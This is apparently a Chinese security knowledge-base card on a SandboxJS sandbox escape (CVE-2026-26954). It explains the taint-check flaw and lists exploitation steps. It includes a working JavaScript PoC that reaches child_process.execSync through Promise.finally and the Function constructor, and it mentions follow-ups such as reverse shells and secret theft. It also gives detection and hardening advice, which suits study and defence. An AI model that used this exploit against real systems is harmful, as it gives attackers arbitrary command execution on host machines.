---
id: binary-pwn-sandbox-escape-sandboxjs-object-values-function-array-fromentries
title: SandboxJS 浅层污点检查失效：Object.values 带出宿主 Function 数组，经 Object.fromEntries 换形后由 Promise.finally 触发逃逸（CVE-2026-26954）
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: sandboxjs-object-values-function-array-taint-bypass
aliases:
- CVE-2026-26954
- SandboxJS 沙箱逃逸
- SandboxJS Sandbox Escape
- Object.values Function 数组
- Object.fromEntries 构造 then
- Promise.finally 逃逸
- Function 构造器逃逸
tags:
- javascript
- nodejs
- sandboxjs
- sandbox-escape
- taint-tracking
- promise
- function-constructor
- rce
- cve-2026-26954
cve:
- CVE-2026-26954
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: < 0.8.34（修复版本 0.8.34）
verification:
  verified_by: verifier-V157
  verified_at: '2026-11-06T07:38:23+08:00'
  notes: 已对照原文与3张图核对：Object.values(this) 带出宿主 Function 数组、getGlobalProp 仅检查数组外壳、Object.fromEntries 换形、Promise.finally 调用攻击者可控 then 触发 Function；advisory GHSA-6r9f-759j-hjgv / CVSS 10.0 / 影响 <0.8.34 与图一致。修复 diff 实为 ticks 参数收敛，卡内已注明不能当作逃逸链的完整修复说明；PoC 未执行。
---

## 一句话结论

SandboxJS 0.8.34 之前对宿主内置方法返回值的“全局对象检查”只检查返回值本身、不递归检查数组元素；攻击者在沙箱内执行 `Object.values(this)` 得到包含宿主 `Function` / `Object` 等构造器的真实数组，再经展开与 `Object.fromEntries` 把危险构造器变成普通对象的 `then` 属性，最后借助原生 `Promise.prototype.finally` 在宿主 Realm 调用该 `then`，等价于执行 `Function(恶意代码)`，从而以宿主权限执行任意命令。

## 原理

- **SandboxJS 的边界**：SandboxJS 用 Lisp 解释器执行 Guest 代码，对属性访问和调用做白名单（`SAFE_PROTOTYPES`）；`Object` 的白名单里包含 `values`、`fromEntries`、`entries` 等，`Promise` 的白名单包含 `then`、`catch`、`finally`。
- **第一处缺陷：只检查外壳，不检查元素**。`Object.values(this)` 由宿主原生执行，返回 `[Function, Object, Array, ...]` 等真实宿主构造器组成的数组。随后代码调用 `getGlobalProp(ret, context)`，该函数只判断 `ret` 本身是不是 `globalThis` 之类的全局对象；`ret` 是新建数组，判断失败返回 `undefined`，于是 `ret = undefined || ret` 原样返回。数组内部元素从未被清洗，宿主 `Function` 引用以“数组元素”的形态进入沙箱。
- **第二处缺陷：展开/换形时不重新校验**。Guest 执行 `...arr` 触发 `CreateArray`，逐元素调用 `valueOrProp(item, context)` 解包；如果元素已经是裸露的宿主引用，函数原样返回，没有再次调用 `sanitizeValue` 判断“这个值是不是被禁止的宿主全局对象”。随后 `Object.fromEntries([['then', ...arr]])` 把数组元素变成对象的属性值；`fromEntries` 也是原生执行，返回的普通对象只经过同一套浅层 `getGlobalProp` 检查。数据从“数组元素”变成“对象属性”的形态转换过程中，危险引用始终没有被深度清洗。
- **为什么用 Promise.finally**：`p.finally` 是宿主原生 `Promise.prototype.finally`，调用时由 JS 引擎在宿主层面执行 Promise 规范逻辑：它会对当前对象（`target`）调用 `target.then(...)`。此时属性读取发生在沙箱解释器之外，宿主引擎直接读取 `target` 内存中的 `then` 指针，发现它指向宿主 `Function` 构造器，于是以恶意字符串调用 `Function`。
- **为什么 Function 构造器等于逃逸**：`Function('code')` 创建的函数作用域是宿主全局作用域，不受沙箱词法环境限制；代码里可直接访问 `process`，再用 `process.getBuiltinModule('child_process')`（Node 22+）或其它宿主能力执行系统命令。
- **根因**：纯 JavaScript 沙箱依赖“污点标记 + 白名单”的组合，但标记只覆盖已知的局部路径；一旦宿主内置方法（`Object.values`、`entries`、`getOwnPropertyNames`、`Reflect.ownKeys` 等）返回的复合对象未被递归标记，或数据在数组/对象/Map 之间换形，标记就会静默丢失，沙箱把宿主引用误判为安全值。

## 触发条件

- 目标使用 SandboxJS < 0.8.34 执行不可信 JavaScript，且 Guest 可控代码。
- 沙箱白名单允许 `Object.values`、`Object.fromEntries`、展开运算符与 `Promise.prototype.finally`（默认配置即满足）。
- 宿主为 Node.js，且存在可利用的宿主能力（`process.getBuiltinModule` 需 Node 22+；旧版本可用 `process.mainModule.require` 等）。
- 未使用独立进程/容器等强隔离，SandboxJS 是唯一安全边界。
- 攻击者能触发沙箱内代码执行（AI Agent 代码解释器、在线 JS 运行器、插件/规则引擎、低代码表达式等）。

## 利用步骤

1. 确认目标使用 SandboxJS 且版本 < 0.8.34；确认 Guest 可执行任意 JS。
2. 在沙箱内创建 Promise：`const p = (async function () {})();`，用于拿到宿主原生 `Promise.prototype.finally`。
3. 用 `Object.values(this)` 取宿主全局对象的值数组；`this` 在沙箱全局中映射到宿主全局，返回值包含宿主 `Function` 等构造器。
4. 用展开运算符 `...Object.values(this).slice(1)` 触发 `CreateArray` 逐元素解包，再用 `Object.fromEntries([['then', ...arr]])` 把数组元素变成对象的 `then` 属性，绕过数组层面的检查。
5. 构造 `{ finally: p.finally, ...obj }`，调用 `.finally('<恶意代码>')()`；宿主 `finally` 会调用 `target.then('<恶意代码>')`，即 `Function('<恶意代码>')`。
6. 恶意代码以宿主权限执行，例如 `process.getBuiltinModule('child_process').execSync('ls', {stdio:'inherit'})`。
7. 用 `id`/`whoami` 或写入文件确认逃逸；后续可反弹 shell、读取环境变量/密钥或加载二阶段载荷。

## PoC

```javascript
// 在 SandboxJS Guest 代码中执行
const p = (async function () {})();
({
  "finally": p.finally,
  ...Object.fromEntries([['then', ...Object.values(this).slice(1)]]),
}).finally(
  'a=process.getBuiltinModule("child_process").execSync("ls", {stdio: "inherit"})'
)();
```

关键链路说明：

```text
Object.values(this)
  -> [宿主 Function, Object, Array, ...]        // 原生返回，含危险构造器
getGlobalProp(array) -> undefined               // 只检查数组本身，不检查元素
...array -> CreateArray/valueOrProp             // 逐元素解包，不再 sanitize
Object.fromEntries([['then', ...array]])        // 危险构造器变成对象的 then 属性
{ finally: p.finally, then: Function }
  .finally('code')                              // 宿主原生 finally 调用 target.then('code')
  -> Function('code')                           // 宿主 Realm 执行
  -> process.getBuiltinModule('child_process')  // RCE
```

说明：`process.getBuiltinModule` 需要 Node.js 22+；旧版本可改用 `process.mainModule.require('child_process')` 等等价的宿主能力。PoC 未在本会话执行。

## 变体与关联

- 变体：`Object.values` 可替换为 `Object.entries`、`Object.getOwnPropertyNames(this)`、`Reflect.ownKeys(this)`、`Object.getOwnPropertyDescriptors(this)` 等同样返回复合结构的宿主内置方法；关键是返回值中的元素是否被递归清洗。
- 变体：换形方式可换成 `Object.assign`、对象展开、`Map`/`Set` 构造、`JSON.parse` 之外的复制原语；只要能把“数组元素”变成“对象属性”或其它被信任的形态，就可能绕过按形态匹配的检查。
- 变体：触发端可换成其他会回调用户可控属性的宿主原生方法，如 `Promise.finally -> then`、`Array.prototype.sort -> 比较函数`、`JSON.stringify -> toJSON`、`toString/valueOf`、`Proxy` trap；核心是“宿主代码主动读取 Guest 可控属性并调用”。
- 关联：[[binary-pwn-sandbox-escape-vm2-global-promise-callback-cve-2026-22709]]（vm2 的 Promise 回调未清洗逃逸）、[[binary-pwn-sandbox-escape-vm2-cross-realm-implicit-call]]（跨 Realm 隐式调用）、[[binary-pwn-sandbox-escape-nodejs-vm-constructor-constructor]]（Node vm 的 constructor.constructor 链）、[[binary-pwn-sandbox-escape-graalvm-hostaccess-all-getclass-rce]]（宿主访问能力放大）。
- 边界：升级到 0.8.34+、禁用 `Object.values`/`fromEntries`/`finally` 等入口、对宿主内置方法返回值做递归深度清洗与来源标记、把沙箱放进独立进程/容器时，本链被阻断或降级。

## 检测与防御

- 修复：升级 SandboxJS 到 0.8.34 或更高版本；以厂商 advisory 的修复范围为准。注意：公开 diff 中同时收敛了 `ticks` 参数（改为固定使用 `context.ctx.ticks`），这属于执行预算隔离的加固，不应被当作该逃逸链的完整修复说明，升级后仍需验证污点传播是否覆盖数组/对象元素。
- 架构：不要把纯 JS 沙箱当作强安全边界；不可信代码应运行在独立进程/Worker + 容器或 microVM 中，叠加文件系统、网络、CPU/内存与系统调用隔离。
- 代码审计：检查沙箱对宿主内置方法返回值的处理是否递归清洗；重点审计 `getGlobalProp`、`valueOrProp`、`CreateArray`、`fromEntries` 等路径，确保数组/对象/Map 的元素与属性都重新校验来源，而不是只看外壳。
- 运行时检测：监控 Guest 代码中的 `Object.values(this)`、`Object.getOwnPropertyNames(this)`、`Reflect.ownKeys(this)`、`Object.fromEntries`、`Promise.finally` 组合；监控宿主进程出现 `Function` 构造器调用、`child_process`、`process.getBuiltinModule`、`process.mainModule` 等异常行为。
- 最小权限：宿主进程以低权限用户运行，限制 `child_process`/文件/网络能力；敏感密钥不放在沙箱宿主进程环境变量中。
